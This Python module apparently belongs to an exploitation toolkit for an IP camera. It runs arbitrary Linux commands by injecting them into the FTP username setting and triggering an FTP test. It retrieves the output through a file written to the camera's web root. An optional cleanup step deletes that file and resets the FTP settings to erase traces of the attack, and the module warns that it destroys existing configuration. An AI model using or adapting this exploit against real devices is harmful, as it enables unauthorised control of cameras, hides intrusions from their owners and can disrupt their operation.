from ..interfaces.http import methods as http_methods
from ..interfaces.http import parameters as http_params
from .. import decorators
import logging

"""
Imports:
    ..interfaces.http.methods as http_methods
    ..interfaces.http.parameters as http_params
    ..decorators
    logging

Contains:
    command_inject
    _command_inject_blind
    _command_inject_ret_min
    _command_inject_ret_long
    _command_inject_ret_clear_ftp
    _command_inject_ret_clear_http
    _command_inject_retrieve

Constants defined here:
    MAX_LEN_BLIND
    MAX_LEN_RET_MIN
    MAX_LEN_RET_LONG
"""

logger = logging.getLogger(__name__)
logger.info(f'Library imported: {__name__}')

MAX_LEN_BLIND = 29
MAX_LEN_RET_MIN = 15
MAX_LEN_RET_LONG = 22

@decorators.debug()
def command_inject(http, command, blind=True, clear=True):
    """
    Command injects 'command' via 'http'

    :param http - The <Http> instance
    :param command - The Linux command to inject
    :param blind - Boolean, whether to return the command's output
        ... Significant time cost can be incurred
    :param clear - Boolean, whether to clear traces of the command
        ... This includes:
        ...     Deleting the file containing the command's output
        ...         (if applicable)
        ...     Deleting the command from the ftp username

    Note: It's avoidable to stay away from commands such as top and ps
    Note: If commands that are blocking are executed, they will
        ... freeze the camera
    Note: This will delete any pre-configured ftp settings
    Note: For blind injection, len(command) <= MAX_LEN_BLIND (29)
        ... For non-blind injection, len(command) <= MAX_LEN_RET_LONG (22)
    Note: The command will be stripped
    """

    command = command.strip()

    if blind:
        if len(command) <= MAX_LEN_BLIND:
            return _command_inject_blind(http, command, clear=clear)
        else:
            logger.warning \
            (
                'Command too long for blind command injection, '
                f'len(command) <= {MAX_LEN_BLIND}'
            )

            return False # Command too long for blind injection
    else:
        if len(command) <= MAX_LEN_RET_MIN:
            return _command_inject_ret_min(http, command, clear=clear)
        elif len(command) <= MAX_LEN_RET_LONG:
            return _command_inject_ret_long(http, command, clear=clear)
        else:
            logger.warning \
            (
                'Command too long for non-blind command injection, '
                f'len(command) <= {MAX_LEN_RET_LONG}'
            )

            return False # Command too long for non-blind injection

@decorators.debug()
def _command_inject_blind(http, command, true_val=False, clear=True):
    """
    Performs blind command injection

    :param http - The <Http> instance
    :param command - The command to inject
    :param true_val - If False, payload=$(command)
        ... If True, payload=command
    :param clear - Boolean, whether to clear traces of the command

    Note: The length of command is asserted to be <= MAX_LEN_BLIND
    """

    assert len(command) <= MAX_LEN_BLIND

    if true_val:
        payload = command
    else:
        payload = f'$({command})'

    parameters = \
    {
        #http_params.FTP_SVR: '',
        #http_params.FTP_PORT: 21,
        http_params.FTP_USER: payload,
        #http_params.FTP_PWD: '',
        #http_params.FTP_DIR: '/',
        #http_params.FTP_MODE: 0,
        #http_params.FTP_UPLOAD_INTERVAL: 0,
    }

    resp_submit = http_methods.set_ftp \
    (
        get_parameters = parameters,
        http = http,
    )

    result_submit = resp_submit.get(http_params.RESULT)

    if result_submit != 'ok':
        logger.debug \
        (
            'http.set_ftp did not return result="ok", '
            'injection failed'
        )

        return False

    resp_apply = http_methods.ftptest(http=http)

    result_apply = resp_apply.get(http_params.RESULT)

    if clear:
        ret_clear = _command_inject_ret_clear_ftp(http)

        if not ret_clear:
            logger.debug('Clearing ftp failed')

            return False

    success = result_apply == 'ok'

    if not success:
        logger.debug \
        (
            'http.ftptest did not return result="ok", '
            'injection failed'
        )

        logger.info \
        (
            'http.ftptest is likely to fail, this does '
            'not neccessarily mean that injection failed'
        )

    return success

@decorators.debug()
def _command_inject_ret_min(http, command, clear=True):
    """
    Performs non-blind command injection on a short command

    :param http - The <Http> instance
    :param command - The command to inject
    :param clear - Boolean, whether to clear traces of the command

    Note: The length of command is asserted to be <= MAX_LEN_RET_MIN
    """

    assert len(command) <= MAX_LEN_RET_MIN

    payload = f'$({command}>/system/www/_)'

    ret_inject = _command_inject_blind(http, payload, clear=False)

    if not ret_inject:
        logger.debug('Blind injection failed')

        return False

    resp_retrieve = _command_inject_retrieve(http)

    if clear:
        ret_clear_ftp = _command_inject_ret_clear_ftp(http)

        if not ret_clear_ftp:
            logger.debug('Clearing ftp failed')

            return False

        ret_clear_http = _command_inject_ret_clear_http(http)

        if not ret_clear_http:
            logger.debug('Clearing http failed')

            return False

    return resp_retrieve

@decorators.debug()
def _command_inject_ret_long(http, command, clear=True):
    """
    Performs non-blind command injection on a long command

    :param http - The <Http> instance
    :param command - The command to inject
    :param clear - Boolean, whether to clear traces of the command

    Note: The length of command is asserted to be <= MAX_LEN_RET_LONG
    """

    assert len(command) <= MAX_LEN_RET_LONG

    payload_write = f'$({command}>/tmp/_)'

    ret_write = _command_inject_blind(http, payload_write, clear=False)

    if not ret_write:
        logger.debug('Bling injection failed to capture stdout')

        return False

    command_move = '$(mv -f /tmp/_ /system/www/_)'

    ret_move = _command_inject_blind(http, command_move, clear=False)

    if not ret_move:
        logger.debug('Blind injection failed to move stdout')

        return False

    resp_retrieve = _command_inject_retrieve(http)

    if clear:
        ret_clear_ftp = _command_inject_ret_clear_ftp(http)

        if not ret_clear_ftp:
            logger.debug('Clearing ftp failed')

            return False

        ret_clear_http = _command_inject_ret_clear_http(http)

        if not ret_clear_http:
            logger.debug('Clearing http failed')
            
            return False

    return resp_retrieve

@decorators.debug()
def _command_inject_ret_clear_ftp(http):
    """
    Clears the ftp settings (which contain the command)

    :param http - The <Http> instance
    """

    command = ''

    return _command_inject_blind(http, command, true_val=True, clear=False)

@decorators.debug()
def _command_inject_ret_clear_http(http):
    """
    Clears the command output file

    :param http - The <Http> instance
    """

    command = 'rm /system/www/_'

    return _command_inject_blind(http, command, clear=False)

@decorators.debug()
def _command_inject_retrieve(http):
    """
    Returns the contents of the command output file

    :param http - The <Http> instance
    """

    resp = http.get('_')

    resp_raw = resp.parse_raw()

    if 'Document Error: Site or Page Not Found' in resp_raw:
        logger.warning \
        (
            'Command injection could not retrieve stdout. '
            'Camera likely using non-vulnerable firmware'
        )

        return None

    return resp_raw
